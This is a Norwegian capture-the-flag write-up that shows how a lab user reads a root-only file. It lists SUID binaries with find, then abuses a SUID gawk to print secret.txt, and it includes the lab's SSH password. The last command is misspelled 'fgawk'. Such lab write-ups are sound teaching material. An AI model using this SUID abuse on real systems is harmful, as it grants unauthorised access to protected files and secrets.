# Unchained

Oppgave: 

```
login@corax ~/1_grunnleggende/1.6_Unchained $ cat LESMEG.md
Koble til med SSH med passord: EnergiskSkjorte

ssh support@unchained
```

Vi får oppgitt et brukernavn og passord til SSH. Når vi logger inn, kan vi liste filene i start mappa:

```
unchained:~$ ls -al
total 4
dr-x------ 1 support support 24 Dec 28 15:52 .
drwxr-xr-x 1 root root 21 Dec 16 21:32 ..
-rw------- 1 root root 33 Dec 28 15:52 secret.txt
```

Det er ganske tydelig at flagget ligger i secret.txt. Siden filen har rettighetene -rw------- og eies av root, har vi ikke tilgang til å lese den direkte. Vi har heller ikke sudo-rettigheter, så vi må finne en annen måte å lese filen på. En nyttig kommando når man gjør CTF-er i Linux, er "find / -type f -perm -4000 2>/dev/null", denne cmd søker gjennom hele systemet (/) etter vanlige filer (-type f) som har SUID-bit satt (-perm -4000), og ignorerer feilmeldinger (2>/dev/null)

```
unchained:~$ find / -perm -4000 2>/dev/null
/bin/busybox
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/gawk
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/gpasswd
/usr/bin/sudo
```

I denne listen ser vi at gawk har SUID-bit satt, Det betyr at vi kan bruke gawk til å lese ut secret.txt med print, Supert! 

```
unchained:~$ fgawk '{print}' secret.txt
FLAGG
```



